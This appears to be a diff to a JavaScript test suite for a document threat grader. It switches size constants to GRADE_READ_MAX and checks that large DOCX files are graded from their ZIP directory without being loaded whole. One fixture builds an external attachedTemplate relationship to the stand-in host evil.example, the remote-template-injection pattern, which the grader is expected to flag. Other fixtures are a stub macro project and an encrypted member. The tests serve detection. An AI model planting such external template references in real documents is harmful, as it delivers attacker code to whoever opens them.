@@ -96,7 +96,7 @@ test("R56 R6: a PDF with a ZIP end joined to it is a polyglot, high; a PDF heade
 /* A DOCX of the size named, its bulk a stored member of zeros, so its directory is at the end and its parts small. */
 const bigDocx = (bytes, extra = []) => docxOf([{ name: "word/media/pad.bin", data: new Uint8Array(bytes), method: 0 }, ...extra]);
 
-test("R56 R51 G130c: a DOCX of 20 MiB + 1 and one of 24 MiB + 1 are graded from the directory, read by range and never loaded, are low when fetched and have no active content, and are rendered; macros and external targets in the directory are seen", async () => {
+test("R56 R51 G130c: a DOCX of GRADE_READ_MAX + 1 and one 4 MiB over it are graded from the directory, read by range and never loaded, are low when fetched and have no active content, and are rendered; macros and external targets in the directory are seen", async () => {
   const w = world();
   const loads = [];
   const get = w.bucket.get.bind(w.bucket);
@@ -105,7 +105,7 @@ test("R56 R51 G130c: a DOCX of 20 MiB + 1 and one of 24 MiB + 1 are graded from 
     if (!o) return o;
     return { ...o, arrayBuffer: async () => { if (!(opts && opts.range) || opts.range.length >= o.size) loads.push(k); return o.arrayBuffer(); } };
   };
-  for (const n of [20 * MIB + 1, 24 * MIB + 1]) {
+  for (const n of [GRADE_READ_MAX + 1, GRADE_READ_MAX + 4 * MIB + 1]) {
     const bytes = bigDocx(n);
     assert.ok(bytes.length > GRADE_READ_MAX);
     const s = await w.capture(bytes);
@@ -120,19 +120,19 @@ test("R56 R51 G130c: a DOCX of 20 MiB + 1 and one of 24 MiB + 1 are graded from 
     assert.equal(w.calls("/render").at(-1).body.route, "office");
   }
   /* the directory shows a macro project and a relationship to a target outside the file */
-  const macro = await w.capture(bigDocx(21 * MIB, [{ name: "word/vbaProject.bin", data: "x" }]));
+  const macro = await w.capture(bigDocx(GRADE_READ_MAX + MIB, [{ name: "word/vbaProject.bin", data: "x" }]));
   assert.deepEqual(codes(await w.fs.threatOf({ captureSha: macro })), ["active:vba-project"]);
   const rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>';
-  const ext = await w.capture(bigDocx(21 * MIB, [{ name: "word/_rels/document.xml.rels", data: rels }]));
+  const ext = await w.capture(bigDocx(GRADE_READ_MAX + MIB, [{ name: "word/_rels/document.xml.rels", data: rels }]));
   assert.deepEqual(codes(await w.fs.threatOf({ captureSha: ext })), ["active:external-target"]);
   const link = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org/" TargetMode="External"/></Relationships>';
-  const hyp = await w.capture(bigDocx(21 * MIB, [{ name: "word/_rels/document.xml.rels", data: link }]));
+  const hyp = await w.capture(bigDocx(GRADE_READ_MAX + MIB, [{ name: "word/_rels/document.xml.rels", data: link }]));
   assert.deepEqual(codes(await w.fs.threatOf({ captureSha: hyp })), [], "a hyperlink acts on a click, not on opening");
   /* an encrypted member shows in the directory too */
-  const encm = await w.capture(bigDocx(21 * MIB, [{ name: "word/media/locked.bin", data: "x", encrypted: "traditional" }]));
+  const encm = await w.capture(bigDocx(GRADE_READ_MAX + MIB, [{ name: "word/media/locked.bin", data: "x", encrypted: "traditional" }]));
   assert.ok(codes(await w.fs.threatOf({ captureSha: encm })).includes("encrypted"));
   /* control: a big PDF is still graded unread (its objects are not in a directory) */
-  const bp = new Uint8Array(21 * MIB).fill(66); bp.set(pdf(false, "bigp"), 0);
+  const bp = new Uint8Array(GRADE_READ_MAX + MIB).fill(66); bp.set(pdf(false, "bigp"), 0);
   const gp = await grade(w, bp);
   assert.deepEqual([gp.format, codes(gp).includes("unread")], ["pdf", true]);
   assert.equal(sha("a").length, 64);
@@ -140,7 +140,7 @@ test("R56 R51 G130c: a DOCX of 20 MiB + 1 and one of 24 MiB + 1 are graded from 
 
 test("R56 G127d: a DOCX held in parts with no whole is graded from range reads across the part seam by its whole digest, never by a part's", async () => {
   const w = world();
-  const whole = bigDocx(24 * MIB + 1);
+  const whole = bigDocx(GRADE_READ_MAX + 4 * MIB + 1);
   const PART = 8 * MIB;
   const parts = [];
   for (let o = 0, i = 0; o < whole.length; o += PART, i++) {
